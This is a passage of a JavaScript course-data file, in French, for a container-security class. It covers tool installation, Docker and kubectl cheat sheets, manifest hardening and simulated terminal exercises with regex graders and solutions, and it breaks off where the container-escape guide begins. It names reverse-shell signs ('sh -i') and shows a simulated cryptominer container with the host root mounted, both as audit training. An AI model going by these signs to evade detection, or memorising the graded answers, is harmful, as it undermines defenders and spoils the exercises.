/* =============================================================
   Virtualisation et sécurité des conteneurs — Pratique et audit
   -------------------------------------------------------------
   Ce fichier COMPLÈTE le cours déclaré dans
   data/cours/virtualisation-conteneurs.js (déclaration, guide
   « Créer et lancer son premier conteneur », QCM de révision).
   Il est reconstruit autour de 7 sujets, dans l'ordre :

     0. Prise en main   — installer et surveiller l'environnement
     1. Docker          — créer, gérer, monitorer un conteneur
     2. Kubernetes      — piloter le cluster et écrire du YAML
     3. Escalade de privilèges — évasion de conteneur : faire / prévenir
     4. Webshell & reverse shell — mécanisme, détection, prévention
     5. Audit — inspecter une image/un conteneur, scanner avec Trivy
     6. Atelier final   — durcir une infra Kubernetes (challenge)
     7. Rapport d'audit — structurer et rédiger le livrable

   Chaque sujet = un ou des GUIDES (fiches de commandes, tableaux)
   + un CHAPITRE d'exercices « terminal » simulés, en français,
   difficulté croissante. À charger APRÈS le fichier de base.

   Convention « Où suis-je dans l'arbre ? » (invite du shell) :
     analyst@ubuntu:~$   → hôte (VM Ubuntu), utilisateur normal
     root@ubuntu:~#      → hôte, root
     root@<id>:/#        → À L'INTÉRIEUR d'un conteneur (id court)
     www-data@dvwa:/$    → dans un POD (le conteneur du pod)
     (kubectl …)         → tapé depuis l'hôte, PARLE au control-plane
   ============================================================= */

(function () {
  "use strict";
  const C = CONTENU["virtualisation-conteneurs"];
  if (!C) { console.warn("virtualisation-conteneurs non déclaré : chargez le fichier de base avant celui-ci."); return; }
  C.guides = C.guides || [];
  C.chapitres = C.chapitres || [];

  /* =========================================================
     SUJET 0 — PRISE EN MAIN : installer et surveiller
     ========================================================= */
  C.guides.push({
    id: "installer-surveiller",
    titre: "Installer et surveiller son environnement",
    resume: "Monter la boîte à outils (Docker, k3s, Helm, Trivy, htop) sur Ubuntu — à la main ou avec un script — puis surveiller conteneurs et cluster. Deux tableaux de commandes et un script d'installation à télécharger.",
    duree: "15 min",
    niveau: "Débutant",
    prealables: [
      "Une machine Ubuntu (ou VM) sur laquelle vous avez les droits `sudo`.",
      "Un usage limité à un environnement de test ou de TP autorisé."
    ],
    sections: [
      {
        type: "partie",
        titre: "Installation",
        texte: "Deux voies : le **script** tout-en-un (téléchargez, lisez, exécutez) ou l'**installation à la main**, commande par commande. Les deux visent Ubuntu et n'installent rien en double."
      },
      {
        titre: "Script d'installation (Ubuntu)",
        texte: "Installe Docker, k3s, Helm, Trivy, htop, procps et nginx. Idempotent : chaque outil n'est posé que s'il manque. Sources officielles uniquement ; k3s et Helm sont **téléchargés puis exécutés**, pas passés en `curl | bash` aveugle.",
        telechargements: [
          {
            nom: "installer-conteneurs.sh",
            source: "installateur-outils-conteneurs",
            legende: "**Ubuntu** : `bash installer-conteneurs.sh`. N'utilise `sudo` qu'au besoin. Rouvrez un terminal ensuite (PATH + groupe `docker`)."
          }
        ],
        points: [
          "**Outils posés :** `docker`, `k3s`/`kubectl`, `helm`, `trivy`, `htop`, `procps` (top/ps/free), `nginx`.",
          "**Sans doublon :** chaque outil est testé (`command -v`) avant installation.",
          "**Vérif rapide après coup :** `docker ps` · `kubectl get nodes` · `trivy --version`."
        ]
      },
      {
        titre: "Installation à la main",
        texte: "Ce que le script fait, étape par étape. `<paquet>` s'installe avec `sudo apt install -y <paquet>` sur Ubuntu.",
        tableau: {
          entetes: ["Outil", "Commande d'installation"],
          lignes: [
            ["Outils système", "`sudo apt update && sudo apt install -y htop procps nginx curl`"],
            ["Docker", "`sudo apt install -y docker.io docker-compose-v2` puis `sudo usermod -aG docker $USER`"],
            ["k3s (Kubernetes)", "`curl -sfL https://get.k3s.io -o k3s.sh` → `less k3s.sh` → `sudo sh k3s.sh`"],
            ["kubeconfig", "`mkdir -p ~/.kube && sudo cp /etc/rancher/k3s/k3s.yaml ~/.kube/config && sudo chown $USER ~/.kube/config`"],
            ["Helm", "`curl -fsSL -o helm.sh https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3` → `chmod 700 helm.sh` → `./helm.sh`"],
            ["Trivy", "dépôt APT officiel Aqua Security, puis `sudo apt install -y trivy`"]
          ]
        },
        remarque: "Pour k3s et Helm on **télécharge d'abord** le script officiel (lisible avec `less`), puis on l'exécute — jamais `curl … | sh` directement.",
        attention: "Après l'ajout au groupe `docker`, déconnectez-vous/reconnectez-vous (ou `newgrp docker`) sinon `docker ps` répond « permission denied »."
      },
      {
        type: "partie",
        titre: "Surveiller (monitoring)",
        texte: "Auditer, c'est d'abord **observer** : charge de la machine, processus, et ce que consomment conteneurs et pods. Un cryptominer ou un reverse shell se repère souvent ici avant tout le reste."
      },
      {
        titre: "Surveiller l'hôte et les conteneurs",
        texte: "De la machine (`htop`, `top`, `procps`) jusqu'au conteneur (`docker stats`, `docker logs`). Tout se tape **depuis l'hôte**.",
        tableau: {
          entetes: ["Commande", "Ce qu'elle montre"],
          lignes: [
            ["`htop`", "Processus interactifs : CPU/RAM par processus, tri, recherche (`F3`), tuer (`F9`)"],
            ["`top`", "Équivalent non interactif toujours présent (`procps`) ; `q` pour quitter"],
            ["`ps aux --sort=-%cpu | head`", "Les processus les plus gourmands en CPU (repère un mineur)"],
            ["`free -h`", "Mémoire disponible / utilisée (`procps`)"],
            ["`docker stats`", "CPU/RAM/réseau/E-S **par conteneur**, en direct"],
            ["`docker top web`", "Les processus tournant DANS le conteneur `web`"],
            ["`docker logs -f web`", "Suit la sortie du conteneur (erreurs, requêtes, connexions)"],
            ["`docker events`", "Flux des événements du démon (create/start/exec/die) en temps réel"]
          ]
        },
        remarque: "Signal d'alerte classique : un conteneur `web` à 100 % de CPU sans trafic, ou dont `docker top` montre un `sh -i`/`bash -i` inattendu."
      },
      {
        titre: "Surveiller le cluster Kubernetes",
        texte: "Les mêmes réflexes, un cran au-dessus : le cluster. `kubectl top` exige que **metrics-server** soit présent (natif sur k3s).",
        tableau: {
          entetes: ["Commande", "Ce qu'elle montre"],
          lignes: [
            ["`kubectl top nodes`", "CPU/RAM consommés par chaque nœud"],
            ["`kubectl top pods -A`", "CPU/RAM par pod, tous namespaces (`-A`)"],
            ["`kubectl get pods -A -o wide`", "État et nœud de chaque pod (repère un `CrashLoopBackOff`)"],
            ["`kubectl logs -f <pod>`", "Suit les logs d'un pod ; `-p` pour l'instance précédente"],
            ["`kubectl get events -A --sort-by=.lastTimestamp`", "Derniers événements du cluster (créations, échecs, évictions)"],
            ["`kubectl describe pod <pod>`", "Détail d'un pod : montages, variables, sondes, raisons d'échec"]
          ]
        },
        attention: "Si `kubectl top` répond « Metrics API not available », `metrics-server` n'est pas prêt — sur k3s, attendez qu'il démarre ; ailleurs, installez-le."
      }
    ]
  });

  /* =========================================================
     SUJET 1 — DOCKER : créer, gérer, monitorer
     ========================================================= */
  C.guides.push({
    id: "fiche-docker",
    titre: "Fiche Docker — créer, gérer, monitorer",
    badge: "Fiche technique",
    resume: "Les commandes du quotidien Docker en tableaux : cycle de vie d'un conteneur, inspection, docker compose. À utiliser depuis l'hôte.",
    duree: "15 min",
    niveau: "Débutant",
    prealables: [
      "Docker installé (voir « Installer et surveiller son environnement »).",
      "Avoir lu le guide « Créer et lancer son premier conteneur »."
    ],
    sections: [
      {
        titre: "Docker — cycle de vie d'un conteneur",
        texte: "Récupérer une image, lancer, observer, entrer, nettoyer. Tout **depuis l'hôte**.",
        tableau: {
          entetes: ["Commande", "Ce qu'elle fait"],
          lignes: [
            ["`docker pull nginx:1.27-alpine`", "Télécharge une image depuis le registre (précisez toujours un tag)"],
            ["`docker images`", "Liste les images présentes localement"],
            ["`docker run -d --name web -p 8080:80 nginx`", "Crée et démarre un conteneur détaché, publie le port 80→8080"],
            ["`docker run --rm -it alpine sh`", "Conteneur jetable interactif ; `--rm` le supprime en sortant"],
            ["`docker ps`", "Conteneurs en cours (`-a` inclut les arrêtés)"],
            ["`docker exec -it web bash`", "Ouvre un shell DANS le conteneur (vous changez de niveau)"],
            ["`docker stop web` / `docker rm web`", "Arrête / supprime le conteneur"],
            ["`docker build -t mon-site:1.0 .`", "Construit une image depuis le `Dockerfile` du dossier courant"]
          ]
        },
        remarque: "`-p hôte:conteneur` : le premier nombre est le port ouvert sur l'hôte, le second celui écouté dans le conteneur."
      },
      {
        titre: "Docker — inspecter et enquêter",
        texte: "En sécurité, avant d'agir on observe. Ces commandes révèlent comment un conteneur est configuré — et donc s'il est dangereux.",
        tableau: {
          entetes: ["Commande", "Ce qu'elle révèle"],
          lignes: [
            ["`docker inspect web`", "Toute la configuration en JSON : montages, privilèges, réseau, variables"],
            ["`docker inspect -f '{{.HostConfig.Privileged}}' web`", "Répond `true`/`false` : le conteneur est-il privilégié ?"],
            ["`docker inspect -f '{{.Mounts}}' web`", "Liste les volumes montés (repère un `/:/host` dangereux)"],
            ["`docker history --no-trunc img`", "Reconstitue les couches / commandes ayant bâti l'image"],
            ["`docker diff web`", "Fichiers ajoutés/modifiés/supprimés depuis le lancement"],
            ["`docker logs -f web`", "Suit la sortie du conteneur (voir aussi la fiche monitoring)"]
          ]
        },
        attention: "Deux signaux d'alerte à chercher en priorité : `\"Privileged\": true` et un montage de `/` ou `/var/run/docker.sock`. Ce sont les deux évasions les plus classiques (voir le sujet « Escalade de privilèges »)."
      },
      {
        titre: "Docker Compose — plusieurs conteneurs",
        texte: "Un fichier `docker-compose.yml` décrit un ensemble de services ; une commande les pilote tous.",
        tableau: {
          entetes: ["Commande", "Ce qu'elle fait"],
          lignes: [
            ["`docker compose up -d`", "Démarre tous les services décrits dans `docker-compose.yml` (détaché)"],
            ["`docker compose ps`", "État des services du projet"],
            ["`docker compose logs -f web`", "Suit les logs du service `web`"],
            ["`docker compose down`", "Arrête et supprime les conteneurs du projet"],
            ["`docker compose config`", "Valide et affiche le fichier résolu (variables comprises)"]
          ]
        },
        remarque: "Le durcissement d'un conteneur (`--read-only`, `--cap-drop`, non-root…) est traité dans le sujet « Escalade de privilèges »."
      }
    ]
  });

  C.chapitres.push({
    id: "ch-docker",
    titre: "Sujet 1 — Docker : créer, gérer, monitorer",
    exercices: [
      {
        type: "terminal",
        id: "term-docker-cycle",
        titre: "Niveau 1 — Cycle de vie d'un conteneur",
        terminal: "bash — hôte Ubuntu",
        invite: "analyst@ubuntu:~$",
        cours: "Vous êtes sur l'**hôte**. Objectif : dérouler le cycle de vie d'un conteneur nginx — le lancer, l'observer, entrer dedans, puis nettoyer. Chaque commande se tape depuis l'hôte.",
        exemple: [
          {
            titre: "Le schéma type",
            code: "docker run -d --name web -p 8080:80 nginx:1.27-alpine\ndocker ps\ndocker logs web",
            note: "`-d` détaché, `--name` pour le retrouver, `-p 8080:80` publie le port."
          }
        ],
        objectifs: [
          {
            enonce: "Téléchargez l'image `nginx:1.27-alpine` depuis le registre.",
            indice: "Sous-commande `pull`, précisez le tag.",
            motifs: ["^docker\\s+pull\\s+nginx:1\\.27-alpine"],
            solution: "docker pull nginx:1.27-alpine",
            sortie: "1.27-alpine: Pulling from library/nginx\nDigest: sha256:...\nStatus: Downloaded newer image for nginx:1.27-alpine"
          },
          {
            enonce: "Lancez un conteneur **détaché** nommé `web` qui publie le port 80 du conteneur sur le 8080 de l'hôte.",
            indice: "`docker run -d --name … -p 8080:80 …`",
            motifs: ["^docker\\s+run\\b", "-d\\b", "--name\\s+web", "-p\\s+8080:80", "nginx"],
            solution: "docker run -d --name web -p 8080:80 nginx:1.27-alpine",
            sortie: "9f3c1a2b7d4e5f6a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a"
          },
          {
            enonce: "Vérifiez que le conteneur tourne.",
            indice: "La commande qui liste les conteneurs en cours.",
            motifs: ["^docker\\s+ps\\b"],
            interdire: ["-a\\b"],
            solution: "docker ps",
            sortie: "CONTAINER ID   IMAGE                COMMAND    STATUS         PORTS                  NAMES\n9f3c1a2b7d4e   nginx:1.27-alpine    ...        Up 3 seconds   0.0.0.0:8080->80/tcp   web"
          },
          {
            enonce: "Affichez les logs du conteneur `web`.",
            indice: "Sous-commande `logs`.",
            motifs: ["^docker\\s+logs\\s+web"],
            solution: "docker logs web",
            sortie: "/docker-entrypoint.sh: Configuration complete; ready for start up\nnginx: ready to handle connections"
          },
          {
            enonce: "Ouvrez un shell **dans** le conteneur `web`.",
            indice: "`docker exec -it … sh` — vous changez de niveau.",
            motifs: ["^docker\\s+exec\\b", "-it\\b", "web", "(sh|bash)\\b"],
            solution: "docker exec -it web sh",
            sortie: "/ # (vous êtes maintenant DANS le conteneur)",
            lieu: "À l'intérieur du conteneur web (image alpine)",
            invite: "root@9f3c1a2b7d4e:/#"
          },
          {
            enonce: "Revenez sur l'hôte.",
            indice: "Une commande de trois lettres (ou Ctrl-D).",
            motifs: ["^exit$"],
            solution: "exit",
            sortie: "(retour à l'hôte)",
            lieu: "De retour sur l'hôte Ubuntu",
            invite: "analyst@ubuntu:~$"
          },
          {
            enonce: "Arrêtez puis supprimez le conteneur `web` (une commande, deux actions au choix).",
            indice: "`docker rm -f web` force l'arrêt et la suppression.",
            motifs: ["^docker\\s+(rm\\s+-f\\s+web|stop\\s+web)"],
            solution: "docker rm -f web",
            sortie: "web"
          }
        ]
      },
      {
        type: "terminal",
        id: "term-docker-inspect",
        titre: "Niveau 2 — Inspecter un conteneur suspect",
        terminal: "bash — hôte Ubuntu",
        invite: "analyst@ubuntu:~$",
        cours: "Un conteneur `suspect` tourne sur la machine. Avant toute action, on **enquête** : est-il privilégié ? Que monte-t-il ? Que consomme-t-il ? Ce sont les trois questions d'un début d'audit.",
        exemple: [
          {
            titre: "Filtrer la sortie de inspect",
            code: "docker inspect -f '{{.HostConfig.Privileged}}' suspect",
            note: "`-f` (format Go) extrait un seul champ au lieu du JSON complet."
          }
        ],
        objectifs: [
          {
            enonce: "Listez **tous** les conteneurs, même arrêtés, pour repérer `suspect`.",
            indice: "`docker ps` avec l'option qui inclut les arrêtés.",
            motifs: ["^docker\\s+ps\\b", "-a\\b"],
            solution: "docker ps -a",
            sortie: "CONTAINER ID   IMAGE     STATUS         NAMES\n4b5c6d7e8f9a   alpine    Up 2 minutes   suspect"
          },
          {
            enonce: "Le conteneur `suspect` est-il **privilégié** ? Répondez avec un `inspect` filtré.",
            indice: "Champ `.HostConfig.Privileged`.",
            motifs: ["^docker\\s+inspect\\b", "Privileged", "suspect"],
            solution: "docker inspect -f '{{.HostConfig.Privileged}}' suspect",
            sortie: "true"
          },
          {
            enonce: "Quels volumes monte-t-il ? (repérez un montage dangereux)",
            indice: "Champ `.Mounts`.",
            motifs: ["^docker\\s+inspect\\b", "Mounts", "suspect"],
            solution: "docker inspect -f '{{.Mounts}}' suspect",
            sortie: "[{bind  /  /host   true rprivate}]   ← la racine de l'hôte est montée sur /host !"
          },
          {
            enonce: "Quels processus tournent **dans** le conteneur ?",
            indice: "`docker top <nom>`.",
            motifs: ["^docker\\s+top\\s+suspect"],
            solution: "docker top suspect",
            sortie: "UID    PID     CMD\nroot   3120    /bin/sh -c 'while true; do xmrig ...; done'   ← cryptominer probable"
          },
          {
            enonce: "Confirmez la surconsommation en direct (CPU/RAM par conteneur).",
            indice: "La commande de statistiques temps réel.",
            motifs: ["^docker\\s+stats"],
            solution: "docker stats suspect",
            sortie: "NAME      CPU %     MEM USAGE\nsuspect   198.4%    412MiB   ← 2 cœurs à fond : cohérent avec un mineur"
          }
        ]
      }
    ]
  });

  /* =========================================================
     SUJET 2 — KUBERNETES : piloter le cluster, écrire du YAML
     ========================================================= */
  C.guides.push({
    id: "fiche-kubectl",
    titre: "Fiche kubectl — piloter un cluster",
    badge: "Fiche technique",
    resume: "Les commandes kubectl en tableaux : observer, déployer, scaler, plus Helm et Kustomize. Tout se tape depuis l'hôte : kubectl parle au control-plane.",
    duree: "15 min",
    niveau: "Intermédiaire",
    prealables: [
      "Un cluster k3s et `kubectl` configuré (voir « Installer et surveiller son environnement »).",
      "Notions de manifest (voir « Écrire une configuration YAML »)."
    ],
    sections: [
      {
        titre: "Observer le cluster",
        texte: "`-A` = tous les namespaces, `-n <ns>` = un namespace précis, `-o wide` = plus de colonnes.",
        tableau: {
          entetes: ["Commande", "Ce qu'elle montre"],
          lignes: [
            ["`kubectl get nodes`", "Les nœuds du cluster et leur état"],
            ["`kubectl get pods -A -o wide`", "Tous les pods, avec leur nœud et IP"],
            ["`kubectl get all -n <ns>`", "Pods, services, deployments… d'un namespace"],
            ["`kubectl describe pod <pod>`", "Détail d'un pod : montages, variables, sondes, événements"],
            ["`kubectl logs -f <pod>`", "Suit les logs d'un pod"],
            ["`kubectl exec -it <pod> -- bash`", "Ouvre un shell DANS le conteneur du pod"]
          ]
        }
      },
      {
        titre: "Déployer et supprimer",
        texte: "Le modèle déclaratif : on décrit l'état voulu dans un YAML, `apply` fait converger le cluster.",
        tableau: {
          entetes: ["Commande", "Ce qu'elle fait"],
          lignes: [
            ["`kubectl apply -f app.yaml`", "Crée/met à jour les ressources décrites par le fichier"],
            ["`kubectl apply --dry-run=server -f app.yaml`", "Valide côté serveur **sans** appliquer"],
            ["`kubectl delete -f app.yaml`", "Supprime les ressources décrites par le fichier"],
            ["`kubectl create namespace demo`", "Crée un namespace `demo`"],
            ["`kubectl get events -A --sort-by=.lastTimestamp`", "Derniers événements (échecs de déploiement…)"]
          ]
        }
      },
      {
        titre: "Scaler et mettre à jour",
        texte: "Ajuster le nombre de réplicas et suivre un déploiement.",
        tableau: {
          entetes: ["Commande", "Ce qu'elle fait"],
          lignes: [
            ["`kubectl scale deploy/web --replicas=5`", "Passe le déploiement `web` à 5 réplicas"],
            ["`kubectl rollout status deploy/web`", "Suit la progression d'une mise à jour"],
            ["`kubectl rollout undo deploy/web`", "Revient à la version précédente"],
            ["`kubectl expose deploy/web --port=80 --type=NodePort`", "Crée un Service exposant le déploiement"]
          ]
        }
      },
      {
        titre: "Helm et Kustomize",
        texte: "Deux façons d'industrialiser : Helm (paquets paramétrables), Kustomize (patches d'une base commune, intégré à kubectl).",
        tableau: {
          entetes: ["Commande", "Ce qu'elle fait"],
          lignes: [
            ["`helm repo add bitnami https://charts.bitnami.com/bitnami`", "Ajoute un dépôt de charts"],
            ["`helm repo update`", "Rafraîchit l'index des dépôts"],
            ["`helm install my-nginx bitnami/nginx -n web`", "Installe un chart (release `my-nginx`)"],
            ["`helm upgrade my-nginx bitnami/nginx -f values.yaml`", "Met à jour la release avec de nouvelles valeurs"],
            ["`helm uninstall my-nginx -n web`", "Désinstalle la release"],
            ["`kubectl apply -k overlays/prod`", "Applique un overlay Kustomize (base + patches)"]
          ]
        },
        remarque: "`kubectl apply -k <dossier>` lit un `kustomization.yaml` ; `kubectl kustomize <dossier>` affiche le rendu sans l'appliquer."
      }
    ]
  });

  C.guides.push({
    id: "guide-yaml",
    titre: "Écrire une configuration YAML (manifests Kubernetes)",
    resume: "La structure d'un manifest, les objets courants avec leur apiVersion, un exemple commenté, et les champs de durcissement (securityContext, resources, probes, NetworkPolicy). Tableaux de champs et fiche de bonnes pratiques.",
    duree: "25 min",
    niveau: "Intermédiaire",
    prealables: [
      "Un cluster (k3s) et `kubectl` configuré.",
      "Savoir déployer un manifest : `kubectl apply -f fichier.yaml`."
    ],
    sections: [
      {
        type: "partie",
        titre: "La structure d'un manifest",
        texte: "Un manifest décrit **l'état souhaité** d'une ressource. Quatre champs de tête reviennent toujours ; le reste dépend du `kind`."
      },
      {
        titre: "Les quatre champs de tête",
        texte: "Présents dans presque tous les manifests, quel que soit l'objet.",
        tableau: {
          entetes: ["Champ", "Rôle"],
          lignes: [
            ["`apiVersion`", "Version de l'API Kubernetes qui gère cet objet (varie selon le `kind`)"],
            ["`kind`", "Type de ressource : `Pod`, `Deployment`, `Service`, `Ingress`, `ConfigMap`…"],
            ["`metadata`", "Nom (`name`), `namespace`, `labels` et `annotations`"],
            ["`spec`", "La spécification proprement dite — son contenu dépend du `kind`"]
          ]
        },
        remarque: "`kubectl explain deployment.spec` (ou n'importe quel chemin) documente chaque champ depuis le terminal."
      },
      {
        titre: "Objets courants et leur apiVersion",
        texte: "La bonne `apiVersion` dépend du `kind` — l'erreur la plus fréquente au premier `apply`.",
        tableau: {
          entetes: ["kind", "apiVersion", "À quoi ça sert"],
          lignes: [
            ["`Pod`", "`v1`", "La plus petite unité : un ou plusieurs conteneurs"],
            ["`Deployment`", "`apps/v1`", "Maintient N réplicas d'une application (via un ReplicaSet)"],
            ["`Service`", "`v1`", "Expose des pods : `ClusterIP`, `NodePort` ou `LoadBalancer`"],
            ["`Ingress`", "`networking.k8s.io/v1`", "Route HTTP/HTTPS externe (`domaine → service`)"],
            ["`ConfigMap` / `Secret`", "`v1`", "Configuration / secrets (Secret = base64, **pas** chiffré)"],
            ["`NetworkPolicy`", "`networking.k8s.io/v1`", "Filtre le trafic réseau entre pods"]
          ]
        },
        attention: "Un `Secret` Kubernetes n'est encodé qu'en **base64**, pas chiffré. Qui lit l'objet lit le secret : chiffrez au repos (etcd) et limitez l'accès par RBAC."
      },
      {
        titre: "Exemple commenté — un Deployment",
        texte: "Le squelette d'un déploiement à 3 réplicas. `selector.matchLabels` doit correspondre **exactement** aux `labels` du `template`.",
        code: [
          "apiVersion: apps/v1",
          "kind: Deployment",
          "metadata:",
          "  name: mon-app",
          "  labels: { app: mon-app }",
          "spec:",
          "  replicas: 3",
          "  selector:",
          "    matchLabels: { app: mon-app }   # doit matcher template.labels",
          "  template:",
          "    metadata:",
          "      labels: { app: mon-app }",
          "    spec:",
          "      containers:",
          "        - name: web",
          "          image: nginx:1.27-alpine   # jamais :latest en prod",
          "          ports: [ { containerPort: 80 } ]"
        ].join("\n")
      },
      {
        type: "partie",
        titre: "Durcir un manifest",
        texte: "Un manifest « qui marche » n'est pas un manifest sûr. Voici les champs qui réduisent la surface d'attaque — ceux qu'un audit vérifie en premier."
      },
      {
        titre: "securityContext — le cœur du durcissement",
        texte: "Se place sur le pod (`spec.securityContext`) et/ou le conteneur (`containers[].securityContext`).",
        tableau: {
          entetes: ["Champ", "Valeur sûre", "Effet"],
          lignes: [
            ["`runAsNonRoot`", "`true`", "Refuse de démarrer si l'image tourne en root"],
            ["`runAsUser`", "`1000` (≠ 0)", "Force un UID non privilégié"],
            ["`allowPrivilegeEscalation`", "`false`", "Bloque tout gain de privilège (SUID, etc.)"],
            ["`privileged`", "`false`", "Jamais `true` : privileged = accès quasi total à l'hôte"],
            ["`readOnlyRootFilesystem`", "`true`", "Racine du conteneur en lecture seule (écrire via un volume)"],
            ["`capabilities`", "`drop: [ALL]`", "Retire toutes les capabilities Linux, on rajoute au besoin"]
          ]
        },
        code: [
          "        securityContext:",
          "          runAsNonRoot: true",
          "          runAsUser: 1000",
          "          allowPrivilegeEscalation: false",
          "          readOnlyRootFilesystem: true",
          "          capabilities:",
          "            drop: [ \"ALL\" ]"
        ].join("\n")
      },
      {
        titre: "Bonnes pratiques — la checklist",
        texte: "Ce qu'un manifest de production devrait toujours contenir.",
        tableau: {
          entetes: ["Bonne pratique", "Pourquoi"],
          lignes: [
            ["Tag d'image figé (`nginx:1.27-alpine`)", "`:latest` rend le déploiement non reproductible et masque les CVE"],
            ["`resources.requests` **et** `limits`", "Évite qu'un pod affame le nœud (CPU/RAM) ; requis pour l'autoscaling"],
            ["Sondes `liveness` / `readiness`", "K8s redémarre un pod bloqué et n'envoie du trafic qu'aux pods prêts"],
            ["`securityContext` durci", "Non-root, no-escalation, FS en lecture seule, capabilities minimales"],
            ["`NetworkPolicy` « deny par défaut »", "Sans elle, tout pod parle à tout pod (mouvement latéral libre)"],
            ["Secrets hors du manifest", "Ne pas committer un `Secret` en clair ; référencer, ne pas coder en dur"]
          ]
        },
        remarque: "Testez un manifest **sans l'appliquer** : `kubectl apply --dry-run=server -f f.yaml` et `kubectl explain <chemin>` pour la doc des champs."
      },
      {
        titre: "NetworkPolicy — refuser puis autoriser",
        texte: "Le patron « deny par défaut » : on bloque tout le trafic entrant d'un namespace, puis on n'ouvre que le nécessaire avec d'autres policies.",
        code: [
          "apiVersion: networking.k8s.io/v1",
          "kind: NetworkPolicy",
          "metadata:",
          "  name: default-deny-ingress",
          "  namespace: prod",
          "spec:",
          "  podSelector: {}          # tous les pods du namespace",
          "  policyTypes: [ Ingress ] # aucun trafic entrant autorisé"
        ].join("\n"),
        attention: "Une `NetworkPolicy` n'a d'effet que si le CNI la supporte. Sur k3s le CNI par défaut (flannel) ne l'applique pas ; installez Calico ou Cilium pour un filtrage réel."
      }
    ]
  });

  C.chapitres.push({
    id: "ch-k8s",
    titre: "Sujet 2 — Kubernetes : piloter et déployer",
    exercices: [
      {
        type: "terminal",
        id: "term-k8s-observer",
        titre: "Niveau 1 — Observer un cluster",
        terminal: "bash — hôte Ubuntu (kubectl → control-plane)",
        invite: "analyst@ubuntu:~$",
        cours: "`kubectl` se tape depuis l'**hôte** mais **parle au control-plane**. Premier réflexe sur un cluster inconnu : cartographier nœuds, pods et namespaces avant tout.",
        exemple: [
          {
            titre: "Tous les pods, tous les namespaces",
            code: "kubectl get pods -A -o wide",
            note: "`-A` = tous les namespaces, `-o wide` ajoute nœud et IP."
          }
        ],
        objectifs: [
          {
            enonce: "Listez les **nœuds** du cluster.",
            indice: "`kubectl get nodes`.",
            motifs: ["^kubectl\\s+get\\s+nodes"],
            solution: "kubectl get nodes",
            sortie: "NAME     STATUS   ROLES                  AGE   VERSION\nubuntu   Ready    control-plane,master   1d    v1.30.5+k3s1"
          },
          {
            enonce: "Listez **tous les pods de tous les namespaces**, avec leur nœud.",
            indice: "`-A` et `-o wide`.",
            motifs: ["^kubectl\\s+get\\s+pods", "-A\\b", "-o\\s+wide"],
            solution: "kubectl get pods -A -o wide",
            sortie: "NAMESPACE     NAME                        READY   STATUS    NODE\nkube-system   coredns-...                 1/1     Running   ubuntu\nweb           mon-app-6c...-2k9x           1/1     Running   ubuntu"
          },
          {
            enonce: "Affichez toutes les ressources du namespace `web`.",
            indice: "`kubectl get all -n <ns>`.",
            motifs: ["^kubectl\\s+get\\s+all", "-n\\s+web"],
            solution: "kubectl get all -n web",
            sortie: "NAME                READY   STATUS\npod/mon-app-...     1/1     Running\nservice/mon-app     ClusterIP ...\ndeployment.apps/mon-app  3/3"
          },
          {
            enonce: "Décrivez le pod pour voir montages, sondes et événements (nom au choix, ex. `mon-app-6c...`).",
            indice: "`kubectl describe pod <pod> -n web`.",
            motifs: ["^kubectl\\s+describe\\s+pod", "-n\\s+web"],
            solution: "kubectl describe pod mon-app-6c -n web",
            sortie: "Name: mon-app-6c...\nContainers: web (nginx:1.27-alpine)\nMounts: /var/run/secrets/kubernetes.io/serviceaccount ...\nEvents: Started container web"
          }
        ]
      },
      {
        type: "terminal",
        id: "term-k8s-deployer",
        titre: "Niveau 2 — Déployer, exposer, scaler (TP2)",
        terminal: "bash — hôte Ubuntu (kubectl → control-plane)",
        invite: "analyst@ubuntu:~$",
        intro: "Vous disposez d'un manifest `deployment.yaml` décrivant un Deployment `web` (image nginx, 3 réplicas). Objectif : le déployer dans un namespace dédié, l'exposer, puis le scaler — le parcours du TP2.",
        cours: "Le modèle déclaratif : `apply` fait converger le cluster vers l'état décrit dans le YAML. On observe ensuite avec `get`, on ajuste avec `scale`.",
        exemple: [
          {
            titre: "Appliquer un manifest",
            code: "kubectl apply -f deployment.yaml -n demo",
            note: "Idempotent : rejouer `apply` met à jour sans tout recréer."
          }
        ],
        objectifs: [
          {
            enonce: "Créez un namespace `demo`.",
            indice: "`kubectl create namespace …`.",
            motifs: ["^kubectl\\s+create\\s+(namespace|ns)\\s+demo"],
            solution: "kubectl create namespace demo",
            sortie: "namespace/demo created"
          },
          {
            enonce: "Déployez le manifest `deployment.yaml` dans le namespace `demo`.",
            indice: "`kubectl apply -f … -n demo`.",
            motifs: ["^kubectl\\s+apply\\s+-f\\s+deployment\\.yaml", "-n\\s+demo"],
            solution: "kubectl apply -f deployment.yaml -n demo",
            sortie: "deployment.apps/web created"
          },
          {
            enonce: "Vérifiez que les 3 réplicas sont prêts.",
            indice: "`kubectl get deploy -n demo`.",
            motifs: ["^kubectl\\s+get\\s+(deploy|deployments)", "-n\\s+demo"],
            solution: "kubectl get deploy -n demo",
            sortie: "NAME   READY   UP-TO-DATE   AVAILABLE   AGE\nweb    3/3     3            3           8s"
          },
          {
            enonce: "Exposez le déploiement `web` via un Service de type NodePort sur le port 80.",
            indice: "`kubectl expose deploy/web --port=80 --type=NodePort -n demo`.",
            motifs: ["^kubectl\\s+expose\\s+(deploy|deployment)", "web", "--type=?NodePort", "-n\\s+demo"],
            solution: "kubectl expose deploy/web --port=80 --type=NodePort -n demo",
            sortie: "service/web exposed"
          },
          {
            enonce: "Passez le déploiement à **5 réplicas**.",
            indice: "`kubectl scale deploy/web --replicas=5 -n demo`.",
            motifs: ["^kubectl\\s+scale", "web", "--replicas=?5", "-n\\s+demo"],
            solution: "kubectl scale deploy/web --replicas=5 -n demo",
            sortie: "deployment.apps/web scaled"
          },
          {
            enonce: "Supprimez enfin le namespace `demo` (nettoyage : emporte tout ce qu'il contient).",
            indice: "`kubectl delete namespace demo`.",
            motifs: ["^kubectl\\s+delete\\s+(namespace|ns)\\s+demo"],
            solution: "kubectl delete namespace demo",
            sortie: "namespace \"demo\" deleted"
          }
        ]
      }
    ]
  });

  /* =========================================================
     SUJET 3 — ESCALADE DE PRIVILÈGES / ÉVASION DE CONTENEUR
     ========================================================= */
  C.guides.push({
    id: "guide-privesc",
    titre: "Escalade de privilèges & évasion de conteneur",
    badge: "Faille pas à pas",
    resume: "Pourquoi un conteneur mal configuré donne l'hôte à l'attaquant : les vecteurs d'évasion (privileged, montage de /, socket Docker), le risque, et comment corriger.",
    duree: "20 min",
    niveau: "Intermédiaire",
    prealables: [
      "Savoir inspecter un conteneur (voir « Fiche Docker »).",
